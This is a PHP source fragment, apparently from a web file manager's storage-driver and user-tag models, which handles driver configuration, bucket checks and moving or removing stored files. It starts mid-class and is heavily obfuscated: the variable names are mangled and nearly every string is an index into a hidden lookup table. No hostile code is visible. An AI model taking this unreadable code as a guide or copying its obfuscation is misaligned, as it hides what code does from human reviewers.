$_SERVER[°‰†òö¯]; $´‰ìÏ‚Ğ = parent::listData($­ò•ƒ’ö, $æÏèÆÖÔ, $¤¤©×á); if ($­ò•ƒ’ö) { return $´‰ìÏ‚Ğ; } $¦‰–áª = array(); if ($GLOBALS[$ó–ºŞêş[2309]]) { $¦‰–áª = $this->ioSizeUseGet(array_to_keyvalue($´‰ìÏ‚Ğ, $ó–ºŞêş[12], $ó–ºŞêş[477])); } foreach ($´‰ìÏ‚Ğ as $¯ó¦†ä¶ => $Çæ‰Éğâ) { unset($´‰ìÏ‚Ğ[$¯ó¦†ä¶][$ó–ºŞêş[6]]); $´‰ìÏ‚Ğ[$¯ó¦†ä¶][$ó–ºŞêş[1960]] = isset($¦‰–áª[$Çæ‰Éğâ[$ó–ºŞêş[477]]]) ? $¦‰–áª[$Çæ‰Éğâ[$ó–ºŞêş[477]]] : 0; } return $´‰ìÏ‚Ğ; } public function ioSizeUseGet($¢Ú™õË„) { $šÅ„Ôª =& $_SERVER[°‰†òö¯]; if (!$¢Ú™õË„) { return array(); } $¨İÇ™ë§ = $šÅ„Ôª[2310] . implode($šÅ„Ôª[50], $¢Ú™õË„); $õşµ›¾¹ = Cache::get($¨İÇ™ë§); if ($õşµ›¾¹) { return $õşµ›¾¹; } $Ú‹„ŠİË = array($šÅ„Ôª[884] => $šÅ„Ôª[477], $šÅ„Ôª[2311] => $šÅ„Ôª[79]); $¿¶éÃñ´ = array($šÅ„Ôª[884] => array($šÅ„Ôª[7], $¢Ú™õË„)); $õşµ›¾¹ = Model($šÅ„Ôª[852])->field($Ú‹„ŠİË)->where($¿¶éÃñ´)->group($šÅ„Ôª[884])->select(); $õşµ›¾¹ = array_to_keyvalue($õşµ›¾¹, $šÅ„Ôª[477], $šÅ„Ôª[79]); Cache::set($¨İÇ™ë§, $õşµ›¾¹, 600); return $õşµ›¾¹; } public function getConfig($Èí£È¨¼) { $•àí”œ€ = parent::listData($Èí£È¨¼); $™¸¤†œÑ = _get($•àí”œ€, $_SERVER[°‰†òö¯][6], array()); if ($™¸¤†œÑ && !is_array($™¸¤†œÑ)) { $™¸¤†œÑ = json_decode($™¸¤†œÑ, !0); } return $™¸¤†œÑ; } public function update($ĞÔÍ§¼Ü, $Ãàß¤Æ×) { $¦Îşø»ø =& $_SERVER[°‰†òö¯]; $Àê×²Û = $Ãàß¤Æ×[$¦Îşø»ø[32]]; $©ô‹üŠ = array_to_keyvalue(parent::listData(), $¦Îşø»ø[32]); if (isset($©ô‹üŠ[$Àê×²Û]) && $©ô‹üŠ[$Àê×²Û][$¦Îşø»ø[477]] != $ĞÔÍ§¼Ü) { return !1; } $this->checkPwd($ĞÔÍ§¼Ü, $Ãàß¤Æ×); if (isset($Ãàß¤Æ×[$¦Îşø»ø[2312]]) && $Ãàß¤Æ×[$¦Îşø»ø[2312]] == $¦Îşø»ø[91]) { $this->checkConfig($Ãàß¤Æ×); } unset($Ãàß¤Æ×[$¦Îşø»ø[2312]]); $ Ù¦Ş§Î = parent::update($ĞÔÍ§¼Ü, $Ãàß¤Æ×); if ($ Ù¦Ş§Î && $Ãàß¤Æ×[$¦Îşø»ø[37]]) { $ª°éÅŒÔ = 0; foreach ($©ô‹üŠ as $« ü©µı) { if ($« ü©µı[$¦Îşø»ø[37]] && $« ü©µı[$¦Îşø»ø[477]] != $ĞÔÍ§¼Ü) { $ª°éÅŒÔ = $« ü©µı[$¦Îşø»ø[477]]; parent::update($« ü©µı[$¦Îşø»ø[477]], array($¦Îşø»ø[37] => 0)); } } $this->updateBackup($ĞÔÍ§¼Ü, $ª°éÅŒÔ); } return $ Ù¦Ş§Î; } public function add($çÅÛ»Å») { $Û¿ª¯Å× =& $_SERVER[°‰†òö¯]; $–ê“¥ÒĞ = array_to_keyvalue(parent::listData(), $Û¿ª¯Å×[32]); if (isset($–ê“¥ÒĞ[$çÅÛ»Å»[$Û¿ª¯Å×[32]]])) { return !1; } $this->checkConfig($çÅÛ»Å»); $šİÈ“½ô = parent::insert($çÅÛ»Å»); if ($šİÈ“½ô && $çÅÛ»Å»[$Û¿ª¯Å×[37]]) { foreach ($–ê“¥ÒĞ as $ø—àîÆ) { if ($ø—àîÆ[$Û¿ª¯Å×[37]]) { parent::update($ø—àîÆ[$Û¿ª¯Å×[477]], array($Û¿ª¯Å×[37] => 0)); } } } return $šİÈ“½ô; } public function updateBackup($àì—Í˜, $ÓÎœ¢ß) { $±ÕÂË…å =& $_SERVER[°‰†òö¯]; if (!$ÓÎœ¢ß) { return; } $™ƒÆù¢ = Model($±ÕÂË…å[809])->config(); if ($™ƒÆù¢[$±ÕÂË…å[1740]] != $±ÕÂË…å[91] || $™ƒÆù¢[$±ÕÂË…å[813]] != $ÓÎœ¢ß) { return; } $†Ö—ë„ = Model($±ÕÂË…å[831])->get($±ÕÂË…å[838]); $†Ö—ë„ = json_decode($†Ö—ë„, !0); if (!$†Ö—ë„) { return; } $†Ö—ë„[$±ÕÂË…å[813]] = $àì—Í˜; Model($±ÕÂË…å[831])->set(array($±ÕÂË…å[838] => $†Ö—ë„)); } public function checkPwd($äÌîƒ§, &$©ç½î°) { $„èÎÊ‰ì =& $_SERVER[°‰†òö¯]; if (empty($©ç½î°[$„èÎÊ‰ì[6]])) { return; } $¼ğ‰¢Ğ = $©ç½î°[$„èÎÊ‰ì[6]]; if (!is_array($¼ğ‰¢Ğ)) { $¼ğ‰¢Ğ = json_decode($¼ğ‰¢Ğ, !0); } $…§˜Ø°æ = $„èÎÊ‰ì[12]; $ñàÍôÉ› = array($„èÎÊ‰ì[2313], $„èÎÊ‰ì[2314], $„èÎÊ‰ì[962]); foreach ($ñàÍôÉ› as $ó©Ö®üä) { if (isset($¼ğ‰¢Ğ[$ó©Ö®üä])) { $…§˜Ø°æ = $ó©Ö®üä; break; } } if (!$…§˜Ø°æ) { return; } $í‹éÏÈº = $this->getConfig($äÌîƒ§); $€éôœáÉ = $í‹éÏÈº[$…§˜Ø°æ]; $ÃÉëÚÑ¿ = $¼ğ‰¢Ğ[$…§˜Ø°æ]; if ($ÃÉëÚÑ¿ == str_repeat($„èÎÊ‰ì[222], strlen($€éôœáÉ))) { $¼ğ‰¢Ğ[$…§˜Ø°æ] = $€éôœáÉ; $©ç½î°[$„èÎÊ‰ì[6]] = json_encode($¼ğ‰¢Ğ); } else { if ($ÃÉëÚÑ¿ != $€éôœáÉ) { $©ç½î°[$„èÎÊ‰ì[2312]] = $„èÎÊ‰ì[91]; } } } public function checkConfig(&$€àƒ î³, $°ÖÖ‰¸Á = false) { $éñóì³‹ =& $_SERVER[°‰†òö¯]; $…íã®óï = strtolower($€àƒ î³[$éñóì³‹[98]]); $Ò£Êø³Ş = $€àƒ î³[$éñóì³‹[6]]; if (!is_array($Ò£Êø³Ş)) { $Ò£Êø³Ş = json_decode($Ò£Êø³Ş, !0); } foreach ($Ò£Êø³Ş as $Ö±š˜šô => $ğ«äšü) { if (is_string($ğ«äšü)) { $Ò£Êø³Ş[$Ö±š˜šô] = trim($ğ«äšü); } } $Ò£Êø³Ş[$éñóì³‹[2315]] = rand_string(6); $Ùë®–ßØ = $GLOBALS[$éñóì³‹[6]][$éñóì³‹[92]][$éñóì³‹[892]]; $Åºœ·§œ = isset($Ùë®–ßØ[$…íã®óï]) ? $Ùë®–ßØ[$…íã®óï] : ucfirst($…íã®óï); $€ãÇ€ÂÌ = $éñóì³‹[77] . $Åºœ·§œ; if (!$Åºœ·§œ || !class_exists($€ãÇ€ÂÌ)) { if ($°ÖÖ‰¸Á) { return LNG($éñóì³‹[2316]); } write_log(array($éñóì³‹[2317], $€àƒ î³, get_caller_info()), $éñóì³‹[215]); show_json(LNG($éñóì³‹[2316]), !1, $€àƒ î³); } $ÀÃšŒ = new $€ãÇ€ÂÌ($Ò£Êø³Ş); $ÔØ÷¥ı = rtrim($Ò£Êø³Ş[$éñóì³‹[1260]], $éñóì³‹[8]) . $éñóì³‹[8]; if (in_array($…íã®óï, $ÀÃšŒ->objectDriver)) { try { if (!$ÀÃšŒ->isBucketCors() && !$ÀÃšŒ->setBucketCors()) { $‹ã³Â‘å = LNG($éñóì³‹[2318]); $‹ã³Â‘å .= $éñóì³‹[2319] . LNG($éñóì³‹[2320]); } } catch (Exception $ÑĞ ÌúÏ) { $‹ã³Â‘å = $ÑĞ ÌúÏ->getMessage(); } if (isset($‹ã³Â‘å)) { return $this->_parseError($‹ã³Â‘å, $…íã®óï, $°ÖÖ‰¸Á); } if ($…íã®óï == $éñóì³‹[68] && !$ÀÃšŒ->checkRegion()) { return $this->_parseError(LNG($éñóì³‹[2321]), $…íã®óï, $°ÖÖ‰¸Á); } } else { if ($…íã®óï == $éñóì³‹[2322]) { if ($ÀÃšŒ->ftpPath) { $Â¬ÊÕê¤ = trim($ÔØ÷¥ı, $éñóì³‹[8]); if (stripos($Â¬ÊÕê¤, trim($ÀÃšŒ->ftpPath, $éñóì³‹[8])) !== 0) { $ÔØ÷¥ı = $ÀÃšŒ->ftpPath . $éñóì³‹[8] . ($Â¬ÊÕê¤ ? $Â¬ÊÕê¤ . $éñóì³‹[8] : $éñóì³‹[12]); } } } } $§üÒƒâÄ = $ÀÃšŒ->getPath($ÔØ÷¥ı . $éñóì³‹[1264]); try { if ($…íã®óï == $éñóì³‹[109]) { $ÀÃšŒ->mkdir($ÔØ÷¥ı); } $›’õĞ•É = $ÀÃšŒ->mkfile($§üÒƒâÄ); if (!$›’õĞ•É) { $‹ã³Â‘å = LNG($éñóì³‹[2318]); } } catch (Exception $ÑĞ ÌúÏ) { $‹ã³Â‘å = $ÑĞ ÌúÏ->getMessage(); } if (isset($‹ã³Â‘å)) { return $this->_parseError($‹ã³Â‘å, $…íã®óï, $°ÖÖ‰¸Á); } $Ò£Êø³Ş[$éñóì³‹[1260]] = $ÔØ÷¥ı; $€àƒ î³[$éñóì³‹[6]] = json_encode($Ò£Êø³Ş); $€àƒ î³[$éñóì³‹[98]] = $Åºœ·§œ; return !0; } private function _parseError($âÂ–êèâ, $÷õ‡úÙÓ, $˜ÂóŞÕ³ = false) { $É„ÉÈË¶ =& $_SERVER[°‰†òö¯]; if ($÷õ‡úÙÓ == $É„ÉÈË¶[68] && stripos($âÂ–êèâ, $É„ÉÈË¶[2323])) { $Ê•ŒÍû = explode($É„ÉÈË¶[10], $âÂ–êèâ); $Îâ»«ñß = isset($Ê•ŒÍû[1]) ? $Ê•ŒÍû[1] : $É„ÉÈË¶[12]; $ÎÚç„³À = array($É„ÉÈË¶[2324] => LNG($É„ÉÈË¶[2325]), $É„ÉÈË¶[2326] => LNG($É„ÉÈË¶[2327])); if (isset($ÎÚç„³À[$Îâ»«ñß])) { $âÂ–êèâ = $ÎÚç„³À[$Îâ»«ñß]; } } if (stripos($âÂ–êèâ, $É„ÉÈË¶[2328]) === 0) { $šÔş»¯ = strpos($âÂ–êèâ, $É„ÉÈË¶[178]); if ($šÔş»¯ === !1) { $šÔş»¯ = strpos($âÂ–êèâ, $É„ÉÈË¶[4]); } if ($šÔş»¯ !== !1) { $âÂ–êèâ = substr($âÂ–êèâ, $šÔş»¯ + 1); } } $âÂ–êèâ = LNG($É„ÉÈË¶[1267]) . $âÂ–êèâ; if ($˜ÂóŞÕ³) { return $âÂ–êèâ; } show_json($âÂ–êèâ, !1); } public function driverListSystem() { $œ´Ïáñ› =& $_SERVER[°‰†òö¯]; $¡½ÊÌş‹ = parent::listData(); $î’ßˆï = array(); foreach ($¡½ÊÌş‹ as $ŠŸú•¶) { unset($ŠŸú•¶[$œ´Ïáñ›[233]], $ŠŸú•¶[$œ´Ïáñ›[88]]); if (!is_array($ŠŸú•¶[$œ´Ïáñ›[6]])) { $ŠŸú•¶[$œ´Ïáñ›[6]] = json_decode($ŠŸú•¶[$œ´Ïáñ›[6]], !0); } $î’ßˆï[] = $ŠŸú•¶; } return $î’ßˆï; } public function defaultDriver() { $’ºŞ½ú² =& $_SERVER[°‰†òö¯]; $š“Ì¯ğÎ = parent::listData(); $¤‰¸ã”€ = array_filter_by_field($š“Ì¯ğÎ, $’ºŞ½ú²[37], 1); $¤‰¸ã”€ = $¤‰¸ã”€[0]; if (!$¤‰¸ã”€) { return array(); } if (!is_array($¤‰¸ã”€[$’ºŞ½ú²[6]])) { $¤‰¸ã”€[$’ºŞ½ú²[6]] = json_decode($¤‰¸ã”€[$’ºŞ½ú²[6]], !0); } return $¤‰¸ã”€; } public function driverInfo($Èö—í“¤) { $ä©¹­§¢ =& $_SERVER[°‰†òö¯]; $±ğ€æ° = array_to_keyvalue(parent::listData(), $ä©¹­§¢[477]); if (!isset($±ğ€æ°[$Èö—í“¤])) { return !1; } $„Ò‰† = $±ğ€æ°[$Èö—í“¤]; if (!is_array($„Ò‰†[$ä©¹­§¢[6]])) { $„Ò‰†[$ä©¹­§¢[6]] = json_decode($„Ò‰†[$ä©¹­§¢[6]], !0); } return $„Ò‰†; } public function remove($Æ„¯öî) { $this->removeShareItems($Æ„¯öî); return parent::remove($Æ„¯öî); } public function removeWithFile($ÛÓŒ×Ä, $·Æüó¸¼, $»Ü²äò, $¡¬±ÎªÉ = false) { $ŒÔôşã— =& $_SERVER[°‰†òö¯]; $Œ‘±ò•· = array($ŒÔôşã—[884] => $ÛÓŒ×Ä); $ÁÔ¿÷¯› = Model($ŒÔôşã—[548])->where($Œ‘±ò•·)->count(); $ŞØĞ‹’ú = Model($ŒÔôşã—[548])->where($Œ‘±ò•·)->sum($ŒÔôşã—[79]); $†¦åØ‰ = $·Æüó¸¼ . $ŒÔôşã—[2329] . $ÛÓŒ×Ä; $ğõÈ¨Á = LNG($·Æüó¸¼ == $ŒÔôşã—[627] ? $ŒÔôşã—[2330] : $ŒÔôşã—[2331]); $Šº¡¹‰ç = new TaskFileTransfer($†¦åØ‰, $ŒÔôşã—[215], $ÁÔ¿÷¯›, $ğõÈ¨Á . $ŒÔôşã—[464] . $»Ü²äò[$ŒÔôşã—[32]] . $ŒÔôşã—[214] . $ÛÓŒ×Ä); $Šº¡¹‰ç->task[$ŒÔôşã—[824]] = (double) $ŞØĞ‹’ú; $¥»²Ì¤ = KodIO::defaultDriver(); $®¬´„·£ = $¥»²Ì¤[$ŒÔôşã—[477]]; $×—Œ¹å = $ôí èËú = $Ä’èÓ‰ = array(); $§¤Ã©´÷ = Model($ŒÔôşã—[232])->where($Œ‘±ò•·)->field($ŒÔôşã—[2332])->select(); foreach ($§¤Ã©´÷ as $ƒÍ¶“À›) { $ÜéæÌ«® = $ƒÍ¶“À›[$ŒÔôşã—[545]]; if ($¡¬±ÎªÉ) { $ôí èËú[] = $ÜéæÌ«®; continue; } $Ê›íì¦ğ = $ƒÍ¶“À›[$ŒÔôşã—[87]]; $ÆÈş³ú÷ = get_path_father($Ê›íì¦ğ); $Ä’èÓ‰[] = $ÆÈş³ú÷; $ÆÈş³ú÷ = str_replace("\x7b\x69\157\x3a{$ÛÓŒ×Ä}\175\57", "\x7b\x69\x6f\72{$®¬´„·£}\x7d\x2f", $ÆÈş³ú÷); if (!IO::exist($Ê›íì¦ğ)) { $×—Œ¹å[] = $ÜéæÌ«®; $Šº¡¹‰ç->updateFileEnd($ƒÍ¶“À›[$ŒÔôşã—[32]], $ƒÍ¶“À›[$ŒÔôşã—[79]]); write_log($ŒÔôşã—[2333] . $Ê›íì¦ğ, $ŒÔôşã—[1903]); continue; } $õ’Ä±×À = IO::move($Ê›íì¦ğ, $ÆÈş³ú÷, REPEAT_RENAME); if (!$õ’Ä±×À) { $ôí èËú[] = $ÜéæÌ«®; $Šº¡¹‰ç->updateFileEnd($ƒÍ¶“À›[$ŒÔôşã—[32]], $ƒÍ¶“À›[$ŒÔôşã—[79]]); write_log($ŒÔôşã—[2334] . $Ê›íì¦ğ, $ŒÔôşã—[1903]); continue; } $Œ‘±ò•· = array($ŒÔôşã—[545] => $ÜéæÌ«®); $ŠØáñÛ = array($ŒÔôşã—[884] => $®¬´„·£, $ŒÔôşã—[87] => $õ’Ä±×À); Model($ŒÔôşã—[232])->where($Œ‘±ò•·)->save($ŠØáñÛ); } $¤¶›É¤‹ = $Šº¡¹‰ç->task; if (!$¡¬±ÎªÉ) { Cache::set($†¦åØ‰, $¤¶›É¤‹); } $Šº¡¹‰ç->end(); $×—Œ¹å = array_unique($×—Œ¹å); $ôí èËú = array_unique($ôí èËú); if (!$¡¬±ÎªÉ && ($×—Œ¹å || $ôí èËú)) { $ôáæ›²Ã = array(); if ($×—Œ¹å) { $ôáæ›²Ã[] = sprintf(LNG($ŒÔôşã—[2335]), count($×—Œ¹å)); } if ($ôí èËú) { $ôáæ›²Ã[] = sprintf(LNG($ŒÔôşã—[2336]), count($ôí èËú)); } $ôáæ›²Ã = sprintf(LNG($ŒÔôşã—[2337]), implode($ŒÔôşã—[2338], $ôáæ›²Ã)) . $ŒÔôşã—[2339] . date($ŒÔôşã—[2340]) . $ŒÔôşã—[2341]; if ($·Æüó¸¼ == $ŒÔôşã—[1940]) { $ôáæ›²Ã .= $ŒÔôşã—[2342] . LNG($ŒÔôşã—[2343]); } else { $ôáæ›²Ã = LNG($ŒÔôşã—[2344]) . $ŒÔôşã—[2345] . $ôáæ›²Ã; } $¤¶›É¤‹[$ŒÔôşã—[1262]] = $ôáæ›²Ã; Cache::set($†¦åØ‰, $¤¶›É¤‹); unset($»Ü²äò[$ŒÔôşã—[6]]); $¹Òóñü¹ = array($ŒÔôşã—[477] => $ÛÓŒ×Ä, $ŒÔôşã—[2214] => $ŒÔôşã—[627], $ŒÔôşã—[32] => $»Ü²äò[$ŒÔôşã—[32]], $ŒÔôşã—[98] => $»Ü²äò[$ŒÔôşã—[98]]); Hook::trigger($ŒÔôşã—[1782], array($ŒÔôşã—[1285] => $¹Òóñü¹, $ŒÔôşã—[1295] => !0)); show_json($ôáæ›²Ã, !1, 100111); } if ($·Æüó¸¼ == $ŒÔôşã—[627]) { return !0; } if ($×—Œ¹å || $ôí èËú) { $ªö€‰£ä = array_merge($×—Œ¹å, $ôí èËú); $ªö€‰£ä = array_filter(array_unique($ªö€‰£ä)); $this->removeByFileID($ªö€‰£ä); } if ($Ä’èÓ‰) { $Ä’èÓ‰ = array_filter(array_unique($Ä’èÓ‰)); foreach ($Ä’èÓ‰ as $Ê›íì¦ğ) { $¢Ñ¯¤«Ô = IO::has($Ê›íì¦ğ, !0); if (!$¢Ñ¯¤«Ô[$ŒÔôşã—[241]] && !$¢Ñ¯¤«Ô[$ŒÔôşã—[242]]) { IO::remove($Ê›íì¦ğ); } } } return $this->remove($ÛÓŒ×Ä); } private function removeByFileID($ò·±ş = array()) { $™­«Ô×™ =& $_SERVER[°‰†òö¯]; if (empty($ò·±ş)) { return; } $›Ì‡Î½² = array($™­«Ô×™[545] => array($™­«Ô×™[7], $ò·±ş)); $åıâŒ‡À = Model($™­«Ô×™[1419])->where($›Ì‡Î½²)->field($™­«Ô×™[193])->select(); if (!$åıâŒ‡À) { return Model($™­«Ô×™[548])->remove($ò·±ş); } $åıâŒ‡À = array_to_keyvalue($åıâŒ‡À, $™­«Ô×™[12], $™­«Ô×™[193]); foreach ($åıâŒ‡À as $¼êä¤ÔÎ) { Model($™­«Ô×™[891])->removeNow($¼êä¤ÔÎ, !1); } } private function removeShareItems($Çò€¾™‘) { $Î„»¼ª“ =& $_SERVER[°‰†òö¯]; $š®ºû¬¼ = "\x7b\151\157\x3a{$Çò€¾™‘}\x7d\x2f"; $«¿åÙ  = array($Î„»¼ª“[193] => 0, $Î„»¼ª“[1255] => array($Î„»¼ª“[461], "{$š®ºû¬¼}\x25")); $¬†¹ä°Â = Model($Î„»¼ª“[1951])->where($«¿åÙ )->field($Î„»¼ª“[672])->select(); if (empty($¬†¹ä°Â)) { return; } $³É¼Æ¡“ = array_to_keyvalue($¬†¹ä°Â, $Î„»¼ª“[12], $Î„»¼ª“[672]); Model($Î„»¼ª“[671])->remove($³É¼Æ¡“); } } goto f°ïİõåÇ; BÇ­î§£³Ì: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($“‰¨ç) { $ÌÃüÊ…š =& $_SERVER[°‰†òö¯]; return array($ÌÃüÊ…š[2087] => array($ÌÃüÊ…š[2516] . USER_ID, $ÌÃüÊ…š[2088])); } protected function listData() { $ñªÄâÓ =& $_SERVER[°‰†òö¯]; $ñµÎã˜ = array($ñªÄâÓ[1762] => USER_ID, $ñªÄâÓ[561] => array($ñªÄâÓ[2091], 0)); $Šá©ŒŒ = $ñªÄâÓ[2517]; $¥üíøÊÂ = $this->field($Šá©ŒŒ)->where($ñµÎã˜)->order($ñªÄâÓ[2094])->select(); return $¥üíøÊÂ ? $¥üíøÊÂ : array(); } protected function addToTag($À…ÖÈ²§, $ê„•ÑØŞ) { $Ö¯¾Å§ =& $_SERVER[°‰†òö¯]; if (!Model($Ö¯¾Å§[2244])->listData($ê„•ÑØŞ)) { return !1; } if (is_numeric($À…ÖÈ²§)) { $àøÙšÏ™ = Model($Ö¯¾Å§[891])->pathInfo($À…ÖÈ²§); if (!$àøÙšÏ™) { return !1; } } else { $àøÙšÏ™ = IO::infoSimple($À…ÖÈ²§); if (!$àøÙšÏ™) { return !1; } $ÌÆı……İ = $àøÙšÏ™[$Ö¯¾Å§[32]]; $Ò‹šîÓ€ = $àøÙšÏ™[$Ö¯¾Å§[33]]; if (isset($àøÙšÏ™[$Ö¯¾Å§[487]])) { $Ò‹šîÓ€ = $àøÙšÏ™[$Ö¯¾Å§[487]] == $Ö¯¾Å§[91] ? $Ö¯¾Å§[78] : $Ö¯¾Å§[232]; } } $ã–Á— = array($Ö¯¾Å§[1762] => USER_ID, $Ö¯¾Å§[561] => $ê„•ÑØŞ, $Ö¯¾Å§[497] => $À…ÖÈ²§, $Ö¯¾Å§[498] => $Ò‹šîÓ€ ? $Ò‹šîÓ€ : $Ö¯¾Å§[492], $Ö¯¾Å§[496] => $ÌÆı……İ ? $ÌÆı……İ : $Ö¯¾Å§[12], $Ö¯¾Å§[1976] => 0); if ($this->where($ã–Á—)->find()) { return !1; } return $this->add($ã–Á—); } protected function removeFromTag($¹í¤§øä, $’€„¨Ã‰) { $¥Çä£“Û =& $_SERVER[°‰†òö¯]; if (!Model($¥Çä£“Û[2244])->listData($’€„¨Ã‰)) { return !1; } if (is_array($¹í¤§øä)) { $¹í¤§øä = array($¥Çä£“Û[7], $¹í¤§øä); } $‹ı°Ş¢† = array($¥Çä£“Û[1762] => USER_ID, $¥Çä£“Û[561] => $’€„¨Ã‰, $¥Çä£“Û[497] => $¹í¤§øä); return $this->where($‹ı°Ş¢†)->delete(); } protected function removeByTag($ÛîŞ¾Ğ) { $‚Ùˆ—ø¢ =& $_SERVER[°‰†òö¯]; if (!$ÛîŞ¾Ğ) { return !1; } $‹ı³÷ÏØ = array($‚Ùˆ—ø¢[1762] => USER_ID, $‚Ùˆ—ø¢[561] => $ÛîŞ¾Ğ); return $this->where($‹ı³÷ÏØ)->delete(); } protected function removeBySource($ Íş±®é) { $ª–Š«² =& $_SERVER[°‰†òö¯]; if (is_array($ Íş±®é)) { $ Íş±®é = array($ª–Š«²[7], $ Íş±®é); } $ö²£âş‘ = array($ª–Š«²[1762] => USER_ID, $ª–Š«²[561] => array($ª–Š«²[1089], 0), $ª–Š«²[497] => $ Íş±®é); return $this->where($ö²£âş‘)->delete(); } }